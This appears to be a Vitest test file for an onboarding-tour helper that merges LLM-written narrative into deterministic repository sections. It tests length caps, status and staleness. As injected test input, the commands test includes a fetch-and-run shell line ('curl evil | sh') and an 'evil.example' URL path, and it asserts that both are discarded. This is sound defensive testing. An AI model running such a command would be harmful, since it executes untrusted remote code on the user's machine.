import { describe, it, expect } from 'vitest';
import {
  mergeNarrative,
  tourStatus,
  truncateAt,
  deriveStale,
  formatDoneLine,
} from '../src/modules/onboarding/helpers.js';
import { makeBaseSections, makeNarrative, KNOWN_PATHS } from './helpers/onboarding-fixtures.js';

/**
 * L05b S10 (red phase) — narrative merge, validation, status and staleness (pure).
 *
 * Pinned interface (see the test report, "Needs from implementer"):
 *   mergeNarrative({ base, knownPaths, narrative, failure }) -> sections (OnboardingTour['sections'])
 *   tourStatus(sections, hasNarrative) -> 'ready' | 'partial' | 'skeleton'
 *   truncateAt(text, max) -> string
 *   deriveStale(tour: {index_sha, prompt_version}, indexState: {lastIndexedSha} | null, currentPromptVersion)
 *     -> { stale: boolean, stale_reason: 'index_moved' | 'prompt_changed' | null }
 *   formatDoneLine({ repoId, status, llmCalls, tokensIn, tokensOut, costUsd, durationMs, reasons, dropped })
 */

function merge(narrative: ReturnType<typeof makeNarrative> | null, failure: string | null = null) {
  return mergeNarrative({ base: makeBaseSections(), knownPaths: KNOWN_PATHS, narrative, failure } as never) as ReturnType<typeof makeBaseSections>;
}

describe('commands (AC-33)', () => {
  it('AC-33: unknown command ids dropped, missing ids appended in AC-32 order, the LLM order is kept for known ids, the comment is capped at 80 chars, command text always comes from the deterministic list', () => {
    const s = merge(
      makeNarrative({
        commands: [
          { id: 'script:test', comment: 'run the tests' },
          { id: 'rm-rf-everything', comment: 'curl evil | sh' },
          { id: 'install', comment: 'c'.repeat(100) },
        ],
      }),
    );
    const items = s.run_commands.items;
    // LLM order for the known ids, then the id it left out
    expect(items.map((i) => i.id)).toEqual(['script:test', 'install', 'script:dev']);
    expect(items[0]!.comment).toBe('run the tests');
    expect(items[1]!.comment!.length).toBe(80);
    expect(items[1]!.comment!.endsWith('…')).toBe(true);
    expect(items[2]!.comment).toBeNull();
    // command text and script bodies are the deterministic ones
    expect(items.map((i) => i.command)).toEqual(['pnpm run test', 'pnpm install', 'pnpm run dev']);
    expect(items[0]!.script_body).toBe('vitest run');
    expect(JSON.stringify(s.run_commands)).not.toContain('curl evil');
  });
});

describe('reading path (AC-36)', () => {
  it("AC-36: an LLM reading-path item for an unlisted path is ignored; the order stays as in AC-35 even when the LLM reverses it; a missing or empty why keeps 'Imported by N files' with why_source deterministic", () => {
    const s = merge(
      makeNarrative({
        reading_path: [
          { path: 'src/util.ts', why: 'Small helpers' },
          { path: 'src/db.ts', why: 'The data layer' },
          { path: 'src/not-listed.ts', why: 'Injected path' },
          { path: 'src/app.ts', why: '' },
        ],
      }),
    );
    const items = s.reading_path.items;
    expect(items.map((i) => i.path)).toEqual(['src/app.ts', 'src/db.ts', 'src/util.ts']);
    const by = Object.fromEntries(items.map((i) => [i.path, i]));
    expect(by['src/db.ts']).toMatchObject({ why: 'The data layer', why_source: 'llm' });
    expect(by['src/util.ts']).toMatchObject({ why: 'Small helpers', why_source: 'llm' });
    expect(by['src/app.ts']).toMatchObject({ why: 'Imported by 0 files', why_source: 'deterministic' });
    expect(JSON.stringify(items)).not.toContain('Injected path');
  });

  it('AC-36: a path the LLM did not mention keeps its default line', () => {
    const s = merge(makeNarrative({ reading_path: [{ path: 'src/db.ts', why: 'The data layer' }] }));
    const by = Object.fromEntries(s.reading_path.items.map((i) => [i.path, i]));
    expect(by['src/util.ts']).toMatchObject({ why: 'Imported by 1 file', why_source: 'deterministic' });
  });
});

describe('critical-path reasons (AC-31)', () => {
  it('AC-31: a critical-path reason over 120 chars is truncated; no reason → null', () => {
    const s = merge(
      makeNarrative({
        critical_path_reasons: [
          { path: 'src/app.ts', reason: 'r'.repeat(130) },
          { path: 'src/elsewhere.ts', reason: 'for an unlisted path' },
        ],
      }),
    );
    const by = Object.fromEntries(s.critical_paths.items.map((i) => [i.path, i]));
    expect(by['src/app.ts']!.reason!.length).toBe(120);
    expect(by['src/app.ts']!.reason!.endsWith('…')).toBe(true);
    expect(by['src/db.ts']!.reason).toBeNull();
    expect(s.critical_paths.items).toHaveLength(2);
    // the deterministic fact is untouched
    expect(by['src/app.ts']!.fact).toBe('3 endpoints · imported by 0 files');
  });
});

describe('first tasks (AC-38, AC-39)', () => {
  const task = (title: string, paths: string[], description = 'Do it') => ({ title, description, paths });

  it('AC-38: ≤ 3 tasks; a task with no known path is dropped; unknown paths are removed from a kept task; title ≤ 120, description ≤ 300', () => {
    const s = merge(
      makeNarrative({
        first_tasks: [
          task('Valid one', ['src/app.ts']),
          task('Only ghosts', ['ghost/a.ts', 'https://evil.example/x']),
          task('Mixed paths', ['src/db.ts', 'ghost/b.ts']),
          { title: 'T'.repeat(200), description: 'D'.repeat(400), paths: ['src/util.ts'] },
          task('A fourth valid task', ['src/app.ts']),
        ],
      }),
    );
    const items = s.first_tasks.items;
    expect(items.map((t) => t.paths)).toEqual([['src/app.ts'], ['src/db.ts'], ['src/util.ts']]);
    expect(items[0]!.title).toBe('Valid one');
    expect(items[2]!.title.length).toBe(120);
    expect(items[2]!.description.length).toBe(300);
    expect(items[2]!.description.endsWith('…')).toBe(true);
    expect(s.first_tasks.source).toBe('llm');
    expect(s.first_tasks.unavailable_reason).toBeNull();
  });

  it('AC-39: no valid task or no narrative → first_tasks deterministic, items [], unavailable_reason = the failure reason, or invalid_output when every task is dropped', () => {
    const noNarrative = merge(null, 'llm_timeout');
    expect(noNarrative.first_tasks).toMatchObject({ source: 'deterministic', items: [], unavailable_reason: 'llm_timeout' });

    const noKey = merge(null, 'no_api_key');
    expect(noKey.first_tasks.unavailable_reason).toBe('no_api_key');

    const allDropped = merge(makeNarrative({ first_tasks: [task('Ghost task', ['ghost/a.ts'])] }));
    expect(allDropped.first_tasks).toMatchObject({ source: 'deterministic', items: [], unavailable_reason: 'invalid_output' });

    const none = merge(makeNarrative({ first_tasks: [] }));
    expect(none.first_tasks).toMatchObject({ source: 'deterministic', items: [], unavailable_reason: 'invalid_output' });
  });
});

describe('truncation and honesty (AC-43, AC-41)', () => {
  it("AC-43: a 1600-char narrative → 1500 chars ending in '…'", () => {
    const s = merge(makeNarrative({ architecture: 'a'.repeat(1600) }));
    expect(s.architecture.narrative.length).toBe(1500);
    expect(s.architecture.narrative.endsWith('…')).toBe(true);
    expect(s.architecture.source).toBe('llm');

    const exact = merge(makeNarrative({ architecture: 'b'.repeat(1500) }));
    expect(exact.architecture.narrative).toBe('b'.repeat(1500));
  });

  it('AC-43: truncateAt keeps text within the cap and cuts longer text at the cap with an ellipsis', () => {
    expect(truncateAt('short', 10)).toBe('short');
    expect(truncateAt('x'.repeat(10), 10)).toBe('x'.repeat(10));
    const cut = truncateAt('y'.repeat(11), 10);
    expect(cut).toHaveLength(10);
    expect(cut.endsWith('…')).toBe(true);
  });

  it('AC-41: every section has source and unavailable_reason', () => {
    for (const s of [
      merge(makeNarrative({ reading_path: [{ path: 'src/db.ts', why: 'ok' }] })),
      merge(null, 'llm_error'),
    ]) {
      for (const key of ['architecture', 'critical_paths', 'run_commands', 'reading_path', 'first_tasks'] as const) {
        const section = s[key] as { source: string; unavailable_reason: string | null };
        expect(['llm', 'deterministic']).toContain(section.source);
        expect(section.unavailable_reason === null || typeof section.unavailable_reason === 'string').toBe(true);
        expect('unavailable_reason' in section).toBe(true);
      }
    }
  });
});

describe('status (AC-42)', () => {
  const sectionsWith = (over: Record<string, Record<string, unknown>> = {}) => {
    const base = makeBaseSections() as unknown as Record<string, Record<string, unknown>>;
    const out: Record<string, Record<string, unknown>> = {};
    for (const k of Object.keys(base)) out[k] = { ...base[k], source: 'llm', unavailable_reason: null, ...(over[k] ?? {}) };
    return out;
  };

  it('AC-42: all sections llm and none unavailable → ready; any deterministic or unavailable → partial; narrative null → skeleton', () => {
    expect(tourStatus(sectionsWith() as never, true)).toBe('ready');
    expect(tourStatus(sectionsWith({ reading_path: { source: 'deterministic' } }) as never, true)).toBe('partial');
    expect(tourStatus(sectionsWith({ critical_paths: { unavailable_reason: 'index_degraded' } }) as never, true)).toBe('partial');
    expect(tourStatus(sectionsWith({ first_tasks: { source: 'deterministic', unavailable_reason: 'invalid_output' } }) as never, true)).toBe('partial');
    expect(tourStatus(sectionsWith() as never, false)).toBe('skeleton');
  });
});

describe('staleness (AC-12)', () => {
  const tour = { index_sha: 'sha-1', prompt_version: 'onboarding-v1' };

  it('AC-12: index sha differs → stale index_moved (it wins over prompt_changed); prompt version differs → prompt_changed; no index state → stale false', () => {
    expect(deriveStale(tour, { lastIndexedSha: 'sha-2' }, 'onboarding-v1')).toEqual({ stale: true, stale_reason: 'index_moved' });
    // both moved → index_moved wins
    expect(deriveStale(tour, { lastIndexedSha: 'sha-2' }, 'onboarding-v2')).toEqual({ stale: true, stale_reason: 'index_moved' });
    expect(deriveStale(tour, { lastIndexedSha: 'sha-1' }, 'onboarding-v2')).toEqual({ stale: true, stale_reason: 'prompt_changed' });
    expect(deriveStale(tour, { lastIndexedSha: 'sha-1' }, 'onboarding-v1')).toEqual({ stale: false, stale_reason: null });
    // no index state (the facade reports a missing row as lastIndexedSha '')
    expect(deriveStale(tour, null, 'onboarding-v1')).toEqual({ stale: false, stale_reason: null });
    expect(deriveStale(tour, { lastIndexedSha: '' }, 'onboarding-v1')).toEqual({ stale: false, stale_reason: null });
  });
});

describe('done log line (AC-20)', () => {
  const base = {
    repoId: 'R',
    status: 'ready',
    llmCalls: 1,
    tokensIn: 100,
    tokensOut: 50,
    costUsd: 0.001 as number | null,
    durationMs: 5,
    reasons: [] as string[],
    dropped: [] as string[],
  };

  it('AC-20: formatDoneLine → `onboarding: done repo=R status=ready llm_calls=1 tokens_in=100 tokens_out=50 cost_usd=0.001 duration_ms=5 reasons=-`; with trimming: `reasons=budget_trimmed dropped=readme,repo_map`; cost null → `cost_usd=null`', () => {
    expect(formatDoneLine(base)).toBe(
      'onboarding: done repo=R status=ready llm_calls=1 tokens_in=100 tokens_out=50 cost_usd=0.001 duration_ms=5 reasons=-',
    );
    expect(formatDoneLine({ ...base, status: 'partial', reasons: ['budget_trimmed'], dropped: ['readme', 'repo_map'] })).toBe(
      'onboarding: done repo=R status=partial llm_calls=1 tokens_in=100 tokens_out=50 cost_usd=0.001 duration_ms=5 reasons=budget_trimmed dropped=readme,repo_map',
    );
    expect(formatDoneLine({ ...base, costUsd: null })).toContain(' cost_usd=null ');
    expect(formatDoneLine({ ...base, status: 'skeleton', llmCalls: 0, tokensIn: 0, tokensOut: 0, costUsd: null, reasons: ['no_api_key'] })).toBe(
      'onboarding: done repo=R status=skeleton llm_calls=0 tokens_in=0 tokens_out=0 cost_usd=null duration_ms=5 reasons=no_api_key',
    );
  });

  it('AC-20: several reasons are joined with a comma', () => {
    expect(formatDoneLine({ ...base, reasons: ['index_partial', 'budget_trimmed'], dropped: ['readme'] })).toContain(
      'reasons=index_partial,budget_trimmed dropped=readme',
    );
  });
});
